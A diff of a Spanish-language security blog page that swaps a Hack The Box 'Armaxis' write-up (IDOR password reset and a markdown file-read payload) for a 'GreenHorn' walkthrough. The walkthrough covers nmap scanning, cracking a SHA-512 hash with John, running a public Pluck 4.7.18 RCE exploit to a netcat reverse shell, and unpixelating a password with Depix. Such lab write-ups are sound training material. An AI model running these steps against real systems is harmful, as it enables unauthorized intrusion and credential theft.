@@ -8,14 +8,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>Armaxis &middot; Loaxert</title>
-  <meta name="title" content="Armaxis &middot; Loaxert" />
+  <title>GreenHorn &middot; Loaxert</title>
+  <meta name="title" content="GreenHorn &middot; Loaxert" />
   
   
-  <meta name="keywords" content="Web, Insecure Direct Object Reference (IDOR), Markdown Injection, " />
+  <meta name="keywords" content="CVE, linux, RCE, pluk, " />
   
   
-  <link rel="canonical" href="http://localhost:1313/htb/challenges/armaxis/" />
+  <link rel="canonical" href="http://localhost:1313/htb/maquinas/greenhorn/" />
   
   
   
@@ -70,23 +70,24 @@
   
   
   
-  <meta property="og:url" content="http://localhost:1313/htb/challenges/armaxis/">
+  <meta property="og:url" content="http://localhost:1313/htb/maquinas/greenhorn/">
   <meta property="og:site_name" content="Loaxert">
-  <meta property="og:title" content="Armaxis">
-  <meta property="og:description" content="Tenemos una url con dos puertos por lo que vamos a visitar los dos a ver que contienen.">
+  <meta property="og:title" content="GreenHorn">
+  <meta property="og:description" content="Descripción : # Una máquina bastante sencilla en la que la enumeración es la clave para hallar la primera contraseña, que te servirá para usar un CVE y obtener una shell.">
   <meta property="og:locale" content="es">
   <meta property="og:type" content="article">
     <meta property="article:section" content="htb">
-    <meta property="article:published_time" content="2025-02-21T17:00:00-05:00">
-    <meta property="article:modified_time" content="2025-02-21T17:00:00-05:00">
-    <meta property="article:tag" content="Web">
-    <meta property="article:tag" content="Insecure Direct Object Reference (IDOR)">
-    <meta property="article:tag" content="Markdown Injection">
+    <meta property="article:published_time" content="2024-11-30T17:00:00-05:00">
+    <meta property="article:modified_time" content="2024-11-30T17:00:00-05:00">
+    <meta property="article:tag" content="CVE">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="RCE">
+    <meta property="article:tag" content="Pluk">
 
   
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Armaxis">
-  <meta name="twitter:description" content="Tenemos una url con dos puertos por lo que vamos a visitar los dos a ver que contienen.">
+  <meta name="twitter:title" content="GreenHorn">
+  <meta name="twitter:description" content="Descripción : # Una máquina bastante sencilla en la que la enumeración es la clave para hallar la primera contraseña, que te servirá para usar un CVE y obtener una shell.">
 
   
   <script type="application/ld+json">
@@ -94,26 +95,26 @@
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Hack The Box",
-    "name": "Armaxis",
-    "headline": "Armaxis",
+    "name": "GreenHorn",
+    "headline": "GreenHorn",
     
-    "abstract": "Tenemos una url con dos puertos por lo que vamos a visitar los dos a ver que contienen.",
+    "abstract": "Descripción : # Una máquina bastante sencilla en la que la enumeración es la clave para hallar la primera contraseña, que te servirá para usar un CVE y obtener una shell.",
     "inLanguage": "es",
-    "url" : "http:\/\/localhost:1313\/htb\/challenges\/armaxis\/",
+    "url" : "http:\/\/localhost:1313\/htb\/maquinas\/greenhorn\/",
     "author" : {
       "@type": "Person",
       "name": "Santiago Chavarro"
     },
-    "copyrightYear": "2025",
-    "dateCreated": "2025-02-21T17:00:00-05:00",
-    "datePublished": "2025-02-21T17:00:00-05:00",
+    "copyrightYear": "2024",
+    "dateCreated": "2024-11-30T17:00:00-05:00",
+    "datePublished": "2024-11-30T17:00:00-05:00",
     
-    "dateModified": "2025-02-21T17:00:00-05:00",
+    "dateModified": "2024-11-30T17:00:00-05:00",
     
-    "keywords": ["Web","Insecure Direct Object Reference (IDOR)","Markdown Injection"],
+    "keywords": ["CVE","linux","RCE","pluk"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "202"
+    "wordCount": "440"
   }]
   </script>
 
@@ -502,7 +503,7 @@
   <header id="single_header" class="mt-5 max-w-prose">
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      Armaxis
+      GreenHorn
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -543,7 +544,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-02-21T17:00:00-05:00">21 febrero 2025</time>
+  <time datetime="2024-11-30T17:00:00-05:00">30 noviembre 2024</time>
   
 
   
@@ -668,27 +669,65 @@
 
 
         <div class="article-content max-w-prose mb-20">
-          <p>Tenemos una url con dos puertos por lo que vamos a visitar los dos a ver que contienen.</p>
-<p><a href="https://imgur.com/INILlbn"><img src="https://i.imgur.com/INILlbn.png" title="source: imgur.com" /></a>
-<a href="https://imgur.com/0DFM6yL"><img src="https://i.imgur.com/0DFM6yL.png" title="source: imgur.com" /></a></p>
-<p>Vemos como tenemos acceso a una bandeja de un correo y en el otro puerto tenemos la opcion de registrar usuarios ingresar y recuperar la contraseña.</p>
-<p>Revisando el codigo fuente nos damos cuenta que la recuperacion de contraseña no esta bien pensada y es vulnerable a un IDOR porque si bien pide un token y verifica que el token sea valido no verifica a quien le pertenece el token, con este en conocimiento le podemos cambiar la contraseña a cualquier usuario.</p>
-<p><a href="https://imgur.com/NgmrWjW"><img src="https://i.imgur.com/NgmrWjW.png" title="source: imgur.com" /></a></p>
-<p>Vamos a tratar de hallar algun correo de administrador en el codigo fuente usando grep:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">grep -r admin
-</span></span></code></pre></div><p><a href="https://imgur.com/Pz55VjH"><img src="https://i.imgur.com/Pz55VjH.png" title="source: imgur.com" /></a></p>
-<p>Solicitamos el cambio de contraseña despues de crear un usuario con el correo que nos dieron:</p>
-<p><a href="https://imgur.com/FpSi3nd"><img src="https://i.imgur.com/FpSi3nd.png" title="source: imgur.com" /></a></p>
-<p>Y hacemos el cambio de contraseña para el usuario administrador:</p>
-<p><a href="https://imgur.com/qw2z1SF"><img src="https://i.imgur.com/qw2z1SF.png" title="source: imgur.com" /></a></p>
-<p>Ahora con eso podemos iniciar sesion como administradores y veremos que tenemos acceso a un funcion para mostrar “weapons”</p>
-<p><a href="https://imgur.com/lAJ1HvJ"><img src="https://i.imgur.com/lAJ1HvJ.png" title="source: imgur.com" /></a></p>
-<p>Tambien vemos que en la nota acepta markdown por lo que podemos tratar de hacer una inyección para obtener la flag.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">img[!](file:///flag.txt)
-</span></span></code></pre></div><p><a href="https://imgur.com/qav1aoI"><img src="https://i.imgur.com/qav1aoI.png" title="source: imgur.com" /></a>
-<a href="https://imgur.com/hRyzZEA"><img src="https://i.imgur.com/hRyzZEA.png" title="source: imgur.com" /></a></p>
-<p>Si pasamos lo que nos muestra el codigo fuente a un decoder de base64 nos dara la flag.</p>
+          
 
+<h3 class="relative group">Descripción : 
+    <div id="descripci%C3%B3n-" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#descripci%C3%B3n-" aria-label="Ancla">#</a>
+    </span>        
+    
+</h3>
+<p>Una máquina bastante sencilla en la que la enumeración es la clave para hallar la primera contraseña, que te servirá para usar un CVE y obtener una shell. Ya para el escalamiento de privilegios, algo absurdo y poco útil, pero entretenido.</p>
+
+
+<h1 class="relative group">Enumeración 
+    <div id="enumeraci%C3%B3n" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#enumeraci%C3%B3n" aria-label="Ancla">#</a>
+    </span>        
+    
+</h1>
+<p>Como siempre, vamos a empezar descubriendo qué puertos hay y con qué servicios.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo nmap -p- --open -sS --min-rate <span class="m">5000</span> -vvv -n -Pn IP -oG allports
+</span></span></code></pre></div><p><a href="https://imgur.com/CVStAE2"><img src="https://i.imgur.com/CVStAE2.png" title="source: imgur.com" /></a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nmap -sCV -p80,22,3000 IP -oN target
+</span></span></code></pre></div><p><a href="https://imgur.com/VoVjrkv"><img src="https://i.imgur.com/VoVjrkv.png" title="source: imgur.com" /></a></p>
+<p>Vemos una página en el puerto 80, por lo que vamos a agregar la IP al /etc/hosts.</p>
+<p>Cuando abrimos la página, vemos que en la parte inferior dice &ldquo;admin&rdquo;. Si le damos clic, nos lleva a un inicio de sesión. Dejaremos esto para más adelante.</p>
+<p><a href="https://imgur.com/iX0hq2a"><img src="https://i.imgur.com/iX0hq2a.png" title="source: imgur.com" /></a></p>
+<p>Ahora vamos a revisar la página, pero por el puerto 3000. Después de buscar un rato, encontramos una especie de repositorio. Si revisamos estos archivos, encontramos un archivo llamado pass.php.</p>
+<p><a href="https://imgur.com/rWOUO3B"><img src="https://i.imgur.com/rWOUO3B.png" title="source: imgur.com" /></a></p>
+<p>Esto nos deja un hash que, si usamos un hash identifier, nos dice que es un SHA-512. Por lo tanto, con John the Ripper lo podemos decodificar.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">john --format<span class="o">=</span>Raw-SHA512 hash.txt /usr/share/wordlist/rockyou.txt
+</span></span></code></pre></div><p><a href="https://imgur.com/vJ89JOu"><img src="https://i.imgur.com/vJ89JOu.png" title="source: imgur.com" /></a></p>
+<p>Si volvemos al <em>login</em> que habíamos encontrado y usamos esta contraseña, nos permite iniciar sesión. Si miramos qué tecnologías tiene la página, nos damos cuenta de que tiene un <strong>Pluck 4.7.18</strong>, que tiene un CVE que podemos explotar con la contraseña que encontramos. Si copiamos este <a href="https://github.com/b0ySie7e/Pluck_Cms_4.7.18_RCE_Exploit/tree/main" target="_blank">exploit de GitHub</a>, podemos obtener una shell.</p>
+<p>Primero, vamos a crear un entorno virtual de Python:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python -m venv <span class="s2">&#34;Enviroment name&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">source</span> <span class="s2">&#34;Enviroment name&#34;</span>/bin/activate
+</span></span></code></pre></div><p>E instalamos este módulo para que el script de GitHub funcione sin problemas:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pip3</span> <span class="n">install</span> <span class="n">requests_toolbelt</span>
+</span></span></code></pre></div><p>Ahora ponemos un <code>nc</code> en escucha y ejecutamos el script con sus parámetros:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span> 
+</span></span><span class="line"><span class="cl">python3 exploit_pluckv4.7.18_RCE.py --password iloveyou1 --ip 10.10.16.47 --port <span class="m">4444</span> --host http://greenhorn.htb
+</span></span></code></pre></div><p>Y con esto tenemos una shell:</p>
+<p><a href="https://imgur.com/JS1Fppw"><img src="https://i.imgur.com/JS1Fppw.png" title="source: imgur.com" /></a></p>
+<p>Si tratamos de cambiar a uno de los dos usuarios, no vamos a encontrar forma de hacerlo. Por lo tanto, al final tratamos de usar la misma contraseña con el usuario <strong>Junior</strong> y nos funcionó.</p>
+<p>Si miramos dentro de la carpeta de <strong>Junior</strong>, hallamos dos cosas: un PDF y la flag. Vamos a montar un servidor HTTP con Python para llevar ese PDF a nuestra máquina.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="p">[</span><span class="n">puerto</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">wget</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">IP</span><span class="p">:[</span><span class="n">puerto</span><span class="p">]</span><span class="o">/</span><span class="s1">&#39;Using OpenVAS.pdf&#39;</span>
+</span></span></code></pre></div><p>Dentro del pdf nos encontramos una especie de carta con una contraseña difuminada</p>
+<p><a href="https://imgur.com/fKDsNls"><img src="https://i.imgur.com/fKDsNls.png" title="source: imgur.com" /></a></p>
+<p>Si buscamos formas de conseguir esta contraseña nos vamos a encontrar este github <a href="https://github.com/spipm/Depix" target="_blank">Depix</a>, ya viendo esto vamos a hacer dos cosas clonar el repositorio y extraer la imagen del pdf en una pagina que nos permita esto, para luego descifrar la contraseña.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git clone https://github.com/spipm/Depix
+</span></span><span class="line"><span class="cl">python3 depix.py -p ../imagen-pdf -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
+</span></span></code></pre></div>
           
           
           
@@ -710,8 +749,8 @@
           
         
       <script>
-        var oid = "views_HTB\/Challenges\/Armaxis.md"
-        var oid_likes = "likes_HTB\/Challenges\/Armaxis.md"
+        var oid = "views_HTB\/Maquinas\/GreenHorn.md"
+        var oid_likes = "likes_HTB\/Maquinas\/GreenHorn.md"
       </script>
       
       
@@ -731,30 +770,30 @@
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/htb/challenges/onlyhacks/">
-              <span
-                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
-                >&larr;</span
-              >
-              <span
-                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
-                >&rarr;</span
-              >
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/htb/maquinas/topology/">
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >OnlyHacks</span
+                  >Topology</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-02-20T17:00:00-05:00">20 febrero 2025</time>
+                    <time datetime="2025-02-21T17:00:00-05:00">21 febrero 2025</time>
                   
                 </span>
               </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
             </a>
-          
-        </span>
-        <span>
           
         </span>
       </div>
